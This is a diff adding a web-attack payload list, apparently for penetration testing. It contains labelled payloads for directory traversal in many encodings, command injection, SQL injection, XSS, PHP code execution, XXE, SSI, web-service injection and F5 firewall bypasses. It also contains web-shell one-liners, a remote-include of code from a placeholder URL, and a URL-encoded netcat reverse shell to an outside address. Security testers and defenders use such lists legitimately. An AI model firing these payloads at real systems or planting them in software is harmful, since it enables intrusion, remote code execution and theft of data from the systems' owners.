@@ -1,0 +1,172 @@
+
+Directory Traversal - For Unix##				/../../../../file
+Directory Traversal - For Windows##				\..\..\..\..\file
+Directory Traversal - Escaping for Unix##		\../\../\../file
+Directory Traversal - Escaping for Windows##	/..\/..\file.txt
+Directory Traversal - Bypassing Filters##		/%c0%ae/WEB-INF/web.xml
+Directory Traversal - Bypassing Filters with dot##		/webapp/WEB-INF./web.xml
+Directory Traversal - with extra dot for Unix##/		.........................../../../../file
+Directory Traversal - with extra dot for windows##		/...........................\..\..\..\file
+Directory Traversal - Double Slash##					/..//..//..//..//file
+Directory Traversal - Multiple Slash##					/..///..///..///..///file
+Directory Traversal - Double Back Slash##				/..\\..\\..\\..\\file
+Directory Traversal - Multiple Back Slash##				/..\\\..\\\..\\\file
+Directory Traversal - Escaping Slash##					/./\/././\/./file
+Directory Traversal - Escaping Back Slash##				/.\/\.\.\/\.\file
+Directory Traversal - single dot for unix##				/././././././././././././file
+Directory Traversal - single dot for windows##			/.\.\.\.\.\.\.\.\.\.\.\.\file
+Directory Traversal - escaping dot for unix##			/./.././.././../file
+Directory Traversal - escaping dot for windows##		/.\..\.\..\.\..\file
+Directory Traversal - Double Slash##					/.//..//.//..//.//..//file
+Directory Traversal - Double Back Slash##				/.\\..\\.\\..\\.\..\\file
+Directory Traversal - espcaping custom filter##			/.//././/././/./boot.ini
+Directory Traversal - espcaping custom filter##			/../..//../..//file
+Directory Traversal - with %5C##						/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/..%5C/dir%5C/file
+Directory Traversal - with backslash escape##			/..\/..\/..\/..\/..\/..\/..\/file
+Directory Traversal - three dot##						/.../.../.../.../.../file
+Directory Traversal - three dot url encoded##			/..%2E/..%2E/..%2E/..%2E/..%2E/file
+
+Directory Traversal - URL Encoding for / -1##			/..%2F..%2F..%2F..%2Fetc/mtc
+Directory Traversal - URL Encoding for \ -2##			/..%5c..%5C..%5Cfile
+Directory Traversal - URL Encoding for . -1##			/%2E%2E/%2E%2E/%2E%2E/etc/mtc
+
+Directory Traversal - Full URL Encoded ##				/%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fmtc
+Directory Traversal - Double URL Encoding for /##		/..%252f..%252F..%252fetc/mtc
+Directory Traversal - Double URL Encoding for .##		/%252E%252E/%252E%252E/%252E%252E/etc/mtc
+Directory Traversal - Full Double URL Encoded##			/%252E%252E%252f%252E%252E%252f%252E%252E%252ffile
+Directory Traversal - Double URL Encoding for \##		/..%255c..%255c..%255cboot.ini
+Directory Traversal - Double URL Encoding for .##		/%252E%252E\%252E%252E\%252E%252E\file
+Directory Traversal - Full URL Encoding for Windows##	/%2e%2e%5c%2e%2e%5c%2e%2e%5cfile
+Directory Traversal - Full Double URL Encodinf##		/%252E%252E%255c%252E%252E%255c%252E%252E%255cfile.ini
+Directory Traversal - UTF-8 Encoding for /##			/..%c0%af..%c0%af..%c0%affile
+Directory Traversal - UTF-8 Encoding for .##			/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/file
+Directory Traversal - Full UTF-8 Encodind ##			/%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%af%c0%ae%c0%ae%c0%affile
+Directory Traversal - Double UTF-8 Encoding for /##		/..%25c0%25af..%25c0%25affile
+Directory Traversal - Double UTF-8 Encoding for .##		/%25c0%25ae%25c0%25ae/%25c0%25ae%25c0%25ae/file
+Directory Traversal - Full Double UTF-8 Encoding##		/%25c0%25ae%25c0%25ae%25c0%25affile
+Directory Traversal - UTF-8 Encoding for \##			/..%c1%9c..%c1%9c\file
+Directory Traversal - UTF-8 Encoding for .##			/%c0%ae%c0%ae\%c0%ae%c0%ae\file
+Directory Traversal - Full UTF-8 Encoding##				/%c0%ae%c0%ae%c1%9c%c0%ae%c0%ae%c1%9cfile
+
+Directory Traversal - Double UTF-8 Encoding for \##		/..%25c1%259c..%25c1%259cfile
+Directory Traversal - Double UTF-8 Encoding for .##		/%25c0%25ae%25c0%25ae\%25c0%25ae%25c0%25ae\file
+
+Directory Traversal - Full Double UTF-8 Encoding##		/%25c0%25ae%25c0%25ae%c1%9c%25c0%25ae%25c0%25ae%c1%9cfile
+
+Directory Traversal - Double Nibble Hex Encoding for /##		/..%%32%66..%%32%66..%%32%66file.ini
+Directory Traversal - Double Nibble Hex Encoding for .##		%%32%65%%32%65/%%32%65%%32%65/file.ini
+
+Directory Traversal - Full Double Nibble Hex Encoding##			/%%32%65%%32%65%%32%66%%32%65%%32%65%%32%66file.ini
+
+Directory Traversal - Double Nibble Hex Encoding for \##		/..%%35%63..%%35%63file
+Directory Traversal - Double Nibble Hex Encoding for .##		/%%32%65%%32%65\%%32%65%%32%65\file
+
+Directory Traversal - Full Double Nibble Hex Encoding##			/%%32%65%%32%65%%35%63%%32%65%%32%65%%35%63file
+Directory Traversal - First Nibble Hex Encoding##				/%%32e%%32e%%32f%%32e%%32e%%32f%%32e%%32e%%32ffile
+Directory Traversal - Second Nibble Hex Encoding##				/%2%65%2%65%2%66%2%65%2%65%2%66%2%65%2%65%2%66file
+Directory Traversal - Microsoft %u encoding##					/%u002e%u002e%u002f%u002e%u002e%u002f%u002e%u002e%u002ffile
+
+===============================================================
+
+
+
+===============================================================
+
+Command Injection - with semicolon##							;ls+-al;
+Command Injection - with pipe##									|+ping+|
+Command Injection - with and##									&&+ping
+Command Injection - with newline##								%0a+ping+localhost+-i+3
+Command Injection - URL Encoded##								..%2F..%2F..%2Fbin/ls%20-al|
+Command Injection - UTF-8 Encoded##								..%c0%af..%c0%af../bin/ls%20-al|
+Command Injection - Full URL Encoded -1##						%31%3b%6c%73%20%2d%61%6c%3b
+Command Injection - FULL URL Encoded -2##						%31%3b%6e%63%20%2d%65%20%2f%62%69%6e%2f%73%68%20%31%2e%31%2e%31%2e%31%20%33%33
+
+===============================================================
+
+HTTP Parameter Pollution - For XSS##							<img&id=+src="http://host">
+HTTP Parameter Pollution - For SQL Injection##					123+select+1&id=2,3+from+table
+HTTP Parameter Pollution - For SQL Injection with comments##	select/*&id=*/user&id=pass/*&id=*/from/*&id=*/users--
+HTTP Parameter Fragmantation##									1+union/*&id1=*/select+username,password/*&id2=*/from+users--
+
+HTTP Response Splitting##										%0d%0aDATA:foo%0d%0a
+
+===============================================================
+
+PHP Code Injection##											{${include("http://url/code.txt")}}
+PHP Code Injection##											1);error_reporting(0);passthru(base64_decode(\$_SERVER[HTTP_CMD])
+PHP Code Injection##											<?php passthru(getenv("HTTP_ACCEPT_LANGUAGE"));?>
+
+PHP Code Execution -1##											5";+echo+"PHP Code";+$aaa="
+PHP Code Execution -2##											data:,<?php eval($_REQUEST[cmd]);?>&cmd=phpinfo();
+PHP Code Execution -3##											";phpinfo();
+PHP Code Execution -4##											phpinfo();
+PHP Code Execution -5##											phpinfo%28%29;
+
+PHP Code Execution - with system##								<?php system("calc.exe"); ?>
+PHP Code Execution - with include##								<?php include $_GET["d"]; ?>
+PHP Code Execution - with exec##								<? exec($_REQUEST["c"]); ?>
+PHP Code Execution - with shell_exec##							<? @shell_exec($_REQUEST["c"]); ?>
+PHP Code Execution - with popen##								<? popen($_REQUEST["c4"]); ?> 
+
+Blind PHP Code Execution -1##									',''));sleep(10);exit;/*
+Blind PHP Code Execution -2##									)''.sleep(10).''
+Blind PHP Code Execution -3##									{${sleep(10)}}
+
+LDAP Injection##												)(sn=*
+
+HTTP Headers - XSS with Via##									Via: <script>alert(1)</script>##2
+HTTP Headers - XSS with X-Forwarded-For##						X-Forwarded-For: <script>alert(1)</script>##2
+HTTP Headers - SQL Injection with Via##							Via: 12'+union+select+abc+from+abc##2
+HTTP Headers - SQL Injection with X-Forwarded-For##				X-Forwarded-For: 12'+and+@@version=1--##2
+HTTP Headers - HTTP Response Splitting With Custom Header##		Header1: 0d%0aDATA:foo%0d%0a%0d%0a##2
+
+URL Re-Writing - XSS##											/app/search/<script>alert()</script>/lang/en
+URL Re-Writing - Blind SQL Injection##							/uyg/id/123+or+1=1/tp/456
+URL Re-Writing - SQL Injection##								/uyg/id/123'+and+@@servername>1--
+URL Re-Writing - Time Based Blind SQL Injection##				'+benchmark(100000,md5(now()))+'
+URL Re-Writing - SQL Injection##								/version()=5.1)/
+
+===============================================================
+
+Source Code Disclosure -1##										/uyg.js%70
+Source Code Disclosure -2##										/uyg.jsp%00
+Source Code Disclosure -3##										/uyg.jsp%0000
+Source Code Disclosure -4##										/uyg.jsp%20
+Source Code Disclosure -5##										/uyg.jsp%25
+Source Code Disclosure -5##										/uyg.JSP
+Source Code Disclosure -6##										/uyg.jsp%5c
+Source Code Disclosure -7##										/uyg.jsp::$$DATA
+Source Code Disclosure -8##										/uyg.jsp/
+Source Code Disclosure -9##										/uyg.jsp.
+Source Code Disclosure -10##									/uyg.jsp+
+Source Code Disclosure -11##									/uyg.jsp*
+Source Code Disclosure -12##									/uyg.jsp;.jsp
+
+===============================================================
+
+XXE - Xml external Entity##										<!ENTITY name SYSTEM "URI">
+SSI - Basic Shell Command Insertion##							<!--#printenv -->
+SSI - CGI Insertion##											<!--#exec cgi="/cgi-bin/example.cgi" -->
+SSI - File Include##											<!--#include virtual="/cgi-bin/example.cgi -->
+
+POST Requests -1##												<script>alert(1)</script>##4
+
+Web Services Simple SQLi -1##									<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue>') union all select null, null, id from users -- </get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services XPath Injection -1##								<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue>nouser'] | P | //user[name/text()='nouser</get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services XSS -1##											<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue><![CDATA[<]]>scr<![CDATA[ipt>]]>var s="goeshere";<![CDATA[<]]>/scr<![CDATA[ipt>]]></get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services XML Entity Expansion Attack -1##					<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue><!DOCTYPE root [<!ENTITY ha "Ha !"><!ENTITY ha2 "&ha; &ha;"><!ENTITY ha3 "&ha2; &ha2;"><!ENTITY ha4 "&ha3; &ha3;"><!ENTITY ha5 "&ha4; &ha4;"><!ENTITY ha6 "&ha54; &ha5;">]><root>&ha6;</root></get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services Referral Attack -1##								<get:GetBillingAccounts><get:searchType>Savings</get:searchType><get:searchCriteria>Name</get:searchCriteria><get:searchValue><!DOCTYPE root [<!ENTITY foo SYSTEM "file:///c:/inetpub/wwwroot/my.pass">]><in>&foo;</in></get:searchValue></get:GetBillingAccountsInputType>##3
+Web Services DoS via SOAP Arrays -1##							<fn:PerformFunction xmlns:fn="foo"><DataSet xsi:type="SOAP-ENC:Array" SOAP-ENC:arrayType="xsd:string[100000]"><item xsi:type="xsd:string">Data1</item><item xsi:type="xsd:string">Data2</item><item xsi:type="xsd:string">Data3</item></DataSet></fn:PerformFunction>##3
+
+F5 Bypass - XSS##												123&CSRT=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&xss=<script>alert(1234)</script>
+F5 Bypass - SQL Injection##										123&CSRT=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&sqli=124'+and+1=1--
+
+PATH_INFO Bypass Simple SQL Injection for Apache##				/index.php/xyz?userid=union+select+@@version--
+PATH_INFO Bypass Simple XSS for Apache##						/index.php/abfi?var=<script>alert(1234)</script>
+
+Path Parameters Bypass SQL Injection##							/test.php;param=value?param=union+select+@@version--
+Path Parameters Bypass XSS##									/test.php;param=value?param=<img+src=1+onerror=alert(44444)>
+
+===============================================================
+
+
